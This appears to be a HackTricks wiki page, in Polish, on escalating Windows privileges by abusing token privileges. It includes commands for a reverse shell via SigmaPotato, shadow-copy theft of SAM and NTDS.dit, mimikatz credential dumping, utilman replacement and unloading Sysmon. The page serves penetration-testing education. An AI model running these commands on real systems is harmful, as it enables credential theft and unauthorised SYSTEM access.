# Abusing Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Jeśli **nie wiesz, czym są Windows Access Tokens**, przeczytaj tę stronę przed kontynuowaniem:


{{#ref}}
access-tokens.md
{{#endref}}

**Być może uda Ci się podnieść uprawnienia, nadużywając tokenów, które już posiadasz**

### SeImpersonatePrivilege

To uprawnienie, które posiada każdy proces, umożliwia impersonation (ale nie tworzenie) dowolnego tokena, pod warunkiem że można uzyskać do niego uchwyt. Uprzywilejowany token można pozyskać z usługi Windows (DCOM), nakłaniając ją do wykonania uwierzytelniania NTLM przeciwko exploitowi, a następnie umożliwiając wykonanie procesu z uprawnieniami SYSTEM. Tę podatność można wykorzystać za pomocą różnych narzędzi, takich jak [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (który wymaga wyłączonego winrm), [SweetPotato](https://github.com/CCob/SweetPotato) oraz [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Współczesne uwagi operatora:

- **JuicyPotato jest legacy**: na Windows 10 1809+/Server 2019+ lepiej użyć **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** lub **PrintSpoofer**, zależnie od tego, która powierzchnia RPC/COM jest nadal osiągalna.
- Jeśli przejąłeś usługę działającą jako **`LOCAL SERVICE`** lub **`NETWORK SERVICE`** i `whoami /priv` pokazuje **filtered token** bez `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, najpierw odzyskaj **default privilege set** tego konta (na przykład za pomocą **FullPowers**), a potem ponownie spróbuj rodziny potato.
- Niektóre nowsze forki są bardziej przyjazne dla operatora niż oryginalne narzędzia. Na przykład **SigmaPotato** dodaje reflection/in-memory execution i nowoczesną kompatybilność z Windows, a **PrintNotifyPotato** nadużywa usługi COM PrintNotify i często jest przydatny, gdy klasyczna ścieżka Spooler jest wyłączona.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Jest bardzo podobne do **SeImpersonatePrivilege**, użyje **tej samej metody** do uzyskania uprzywilejowanego tokena.\
Następnie to uprawnienie pozwala **przypisać primary token** do nowego/zawieszonego procesu. Z uprzywilejowanego impersonation token można wyprowadzić primary token (DuplicateTokenEx).\
Za pomocą tokena możesz utworzyć **nowy proces** przy użyciu 'CreateProcessAsUser' albo utworzyć proces w stanie zawieszenia i **ustawić token** (ogólnie nie można modyfikować primary token działającego procesu).

### SeTcbPrivilege

Jeśli masz włączony ten token, możesz użyć **KERB_S4U_LOGON** do uzyskania **impersonation token** dowolnego innego użytkownika bez znajomości poświadczeń, **dodać dowolną grupę** (admins) do tokena, ustawić **poziom integralności** tokena na "**medium**" i przypisać ten token do **bieżącego wątku** (SetThreadToken).

### SeBackupPrivilege

Ten privilege powoduje, że system **przyznaje pełny dostęp do odczytu** do dowolnego pliku (ograniczony do operacji odczytu). Jest wykorzystywany do **odczytu hashy haseł lokalnych kont Administrator** z rejestru, po czym można użyć narzędzi takich jak "**psexec**" lub "**wmiexec**" z hashem (technika Pass-the-Hash). Jednak ta technika zawodzi w dwóch przypadkach: gdy konto Local Administrator jest wyłączone albo gdy obowiązuje polityka, która usuwa prawa administracyjne z Local Administrators łączących się zdalnie.\
W praktyce najbardziej niezawodny wbudowany workflow to zwykle **VSS + `robocopy /b`**: utwórz/udostępnij shadow copy, a następnie skopiuj `SAM`/`SYSTEM` lub `NTDS.dit` w **backup mode**, co omija ACL plików.
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
You can **abuse this privilege** with:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- following **IppSec** in [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Or as explained in the **escalating privileges with Backup Operators** section of:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Uprawnienie do **zapisu** do dowolnego pliku systemowego, niezależnie od listy kontroli dostępu pliku (ACL), zapewnia to uprawnienie. Otwiera to wiele możliwości eskalacji, w tym możliwość **modyfikowania usług**, wykonywania DLL Hijacking oraz ustawiania **debuggers** poprzez Image File Execution Options, a także innych technik.

### SeCreateTokenPrivilege

SeCreateTokenPrivilege to potężne uprawnienie, szczególnie przydatne, gdy użytkownik ma możliwość impersonate tokenów, ale także w przypadku braku SeImpersonatePrivilege. Ta możliwość opiera się na zdolności do impersonate tokena, który reprezentuje tego samego użytkownika i którego poziom integralności nie przekracza poziomu bieżącego procesu.

**Key Points:**

- **Impersonation without SeImpersonatePrivilege:** Możliwe jest wykorzystanie SeCreateTokenPrivilege do EoP poprzez impersonate tokenów w określonych warunkach.
- **Conditions for Token Impersonation:** Udane impersonation wymaga, aby docelowy token należał do tego samego użytkownika i miał poziom integralności mniejszy lub równy poziomowi integralności procesu próbującego impersonation.
- **Creation and Modification of Impersonation Tokens:** Użytkownicy mogą utworzyć impersonation token i wzmocnić go, dodając SID (Security Identifier) uprzywilejowanej grupy.

### SeLoadDriverPrivilege

To uprawnienie pozwala **ładować i odładowywać sterowniki urządzeń** poprzez utworzenie wpisu rejestru z określonymi wartościami `ImagePath` i `Type`. Ponieważ bezpośredni zapis do `HKLM` (HKEY_LOCAL_MACHINE) jest ograniczony, należy użyć `HKCU` (HKEY_CURRENT_USER). Jednak aby `HKCU` było rozpoznawane przez kernel do konfiguracji sterownika, trzeba użyć określonej ścieżki.

Nowoczesne użycie ofensywne to zwykle **BYOVD** (bring your own vulnerable driver): załaduj **podpisany, ale podatny** sterownik kernelowy, a następnie użyj jego IOCTLs, aby wyłączyć zabezpieczenia lub przejść do wykonania kodu w kernelu. Pamiętaj, że w nowszych wersjach Windows 11/Server **Microsoft vulnerable driver blocklist** i/lub **HVCI/Memory Integrity** często psują starsze publiczne chainy, więc klasyczne przykłady w stylu `szkg64.sys` nie są już uniwersalnie niezawodne.

Ta ścieżka to `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, gdzie `<RID>` jest Relative Identifier bieżącego użytkownika. Wewnątrz `HKCU` trzeba utworzyć całą tę ścieżkę i ustawić dwie wartości:

- `ImagePath`, czyli ścieżkę do binarki, która ma zostać wykonana
- `Type`, z wartością `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Steps to Follow:**

1. Uzyskaj dostęp do `HKCU` zamiast `HKLM` z powodu ograniczonego dostępu do zapisu.
2. Utwórz w `HKCU` ścieżkę `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, gdzie `<RID>` oznacza Relative Identifier bieżącego użytkownika.
3. Ustaw `ImagePath` na ścieżkę wykonania binarki.
4. Przypisz `Type` jako `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Więcej sposobów nadużycia tego privilege w [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

To jest podobne do **SeRestorePrivilege**. Jego główna funkcja pozwala procesowi **przejąć ownership obiektu**, omijając wymóg jawnego discretionary access poprzez nadanie uprawnień WRITE_OWNER access rights. Proces polega najpierw na zabezpieczeniu ownership docelowego registry key do celów zapisu, a następnie na modyfikacji DACL, aby umożliwić write operations.
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

To uprawnienie pozwala na **debugowanie innych procesów**, w tym na odczyt i zapis w pamięci. Z tym uprawnieniem można stosować różne strategie memory injection, zdolne do omijania większości antivirus i host intrusion prevention solutions.

Na nowoczesnym Windows pamiętaj, że `SeDebugPrivilege` zwykle wystarcza, aby otworzyć **niechronione procesy SYSTEM** i duplikować ich tokeny, ale **nie** daje gwarancji, że da się dotknąć **LSASS**. Jeśli włączone jest **RunAsPPL / LSA Protection**, niechronione procesy nie mogą odczytywać ani wstrzykiwać do LSASS, nawet jeśli obecne jest `SeDebugPrivilege`. W takim przypadku ukradnij token z innego procesu SYSTEM bez PPL albo połącz to z PPL bypass/BYOVD zamiast zakładać, że `procdump` zadziała. Pełny przykład kopiowania tokena z użyciem `SeDebugPrivilege` + `SeImpersonatePrivilege` znajdziesz na [tej stronie](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Możesz użyć [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) z [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite), aby **zrzucić pamięć procesu**. W szczególności może to dotyczyć procesu **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, który odpowiada za przechowywanie poświadczeń użytkownika po pomyślnym zalogowaniu do systemu.

Następnie możesz wczytać ten dump w mimikatz, aby uzyskać hasła:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Jeśli chcesz uzyskać powłokę `NT SYSTEM`, możesz użyć:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

To uprawnienie (Perform volume maintenance tasks) pozwala otwierać surowe uchwyty urządzeń wolumenów (np., \\.\C:) dla bezpośredniego I/O dysku, z pominięciem NTFS ACLs. Dzięki temu można skopiować bajty dowolnego pliku na wolumenie, odczytując podstawowe bloki, co umożliwia arbitralny odczyt plików wrażliwych danych (np. machine private keys w %ProgramData%\Microsoft\Crypto\, registry hives, SAM/NTDS via VSS). Jest to szczególnie istotne na serwerach CA, gdzie exfiltrating CA private key umożliwia forging Golden Certificate, aby impersonate dowolny principal.

Zobacz szczegółowe techniki i mitigations:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{endref}}

## Check privileges
```
whoami /priv
```
**Tokeny**, które pojawiają się jako Disabled, zwykle można włączyć, więc często można nadużyć zarówno _Enabled_, jak i _Disabled_ privileges.

### Włącz wszystkie tokeny

Jeśli masz wyłączone privileges, możesz użyć skryptu [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1), aby włączyć wszystkie tokeny:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Lub skrypt osadzony w tym [**poście**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Table

Pełny cheatsheet uprawnień tokenów znajdziesz na [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), poniższe podsumowanie wymienia tylko bezpośrednie sposoby wykorzystania uprawnienia do uzyskania sesji admina lub odczytu poufnych plików.

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| ------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                      | Dziękuję [Aurélien Chalot](https://twitter.com/Defte_) za aktualizację. Postaram się to wkrótce przepisać na coś bardziej w stylu przepisu.                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | Czytaj poufne pliki za pomocą `robocopy /b` albo dedykowanych helperów kopiujących obsługujących SeBackup.                                                                                                                                                                                                                                         | <p>- Świetne do `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit` i czasem `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` jest wygodne, ale dedykowane cmdlety/API dla SeBackup często są bardziej elastyczne dla zablokowanych/otwartych plików.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Utwórz dowolny token, w tym z lokalnymi uprawnieniami administratora, za pomocą `NtCreateToken`.                                                                                                                                                                                                                                                 |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Zduplikuj token SYSTEM **non-PPL** albo zrzut pamięci z procesu niechronionego.                                                                                                                                                                                                                                                                  | <p>Dumpowanie LSASS jest zwykle blokowane, jeśli włączone jest RunAsPPL/LSA Protection.</p><p>Skrypt można znaleźć na [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | Użyj **rodziny Potato** / impersonacji przez named-pipe, aby uruchomić SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, itd.).                                                                                                                                                                            | <p>Najpraktyczniejsze z kont usługowych, takich jak IIS APPPOOL, MSSQL, zadania harmonogramu albo dowolny kontekst, który już ma `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Załaduj podpisany, ale podatny sterownik jądra (BYOVD)<br>2. Użyj IOCTL-i sterownika, aby uzyskać kernel R/W, wyłączyć narzędzia bezpieczeństwa albo podnieść uprawnienia do SYSTEM<br><br>Alternatywnie to uprawnienie można użyć do wyładowania sterowników związanych z bezpieczeństwem za pomocą wbudowanej komendy <code>fltMC</code>, np. <code>fltMC sysmondrv</code></p>                     | <p>Starsze publiczne sterowniki, takie jak <code>szkg64.sys</code>, są coraz częściej blokowane na nowoczesnym Windows przez vulnerable-driver blocklist / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Uruchom PowerShell/ISE z obecnym uprawnieniem SeRestore.<br>2. Włącz uprawnienie za pomocą <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Zmień nazwę utilman.exe na utilman.old<br>4. Zmień nazwę cmd.exe na utilman.exe<br>5. Zablokuj konsolę i naciśnij Win+U</p> | <p>Atak może zostać wykryty przez niektóre oprogramowanie AV.</p><p>Alternatywna metoda opiera się na podmienianiu binarek usług przechowywanych w "Program Files" przy użyciu tego samego uprawnienia</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Zmień nazwę cmd.exe na utilman.exe<br>4. Zablokuj konsolę i naciśnij Win+U</p>                                                                                                                                       | <p>Atak może zostać wykryty przez niektóre oprogramowanie AV.</p><p>Alternatywna metoda opiera się na podmienianiu binarek usług przechowywanych w "Program Files" przy użyciu tego samego uprawnienia.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Manipuluj tokenami tak, aby zawierały lokalne uprawnienia administratora. Może wymagać SeImpersonate.</p><p>Do weryfikacji.</p>                                                                                                                                                                                                                |                                                                                                                                                                                                                                                                                                                                |

## References

- Sprawdź tę tabelę definiującą Windows tokens: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- Sprawdź [**ten paper**](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) o privesc z użyciem tokenów.
- itm4n – Give Me Back My Privileges! Please? (restricted service tokens / FullPowers): https://itm4n.github.io/localservice-privileges/
- Microsoft – Robocopy (`/b` backup mode omija sprawdzanie ACL plików/folderów): https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
- Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege): https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks
- 0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate): https://0xdf.gitlab.io/2025/10/04/htb-certificate.html

{{#include ../../banners/hacktricks-training.md}}
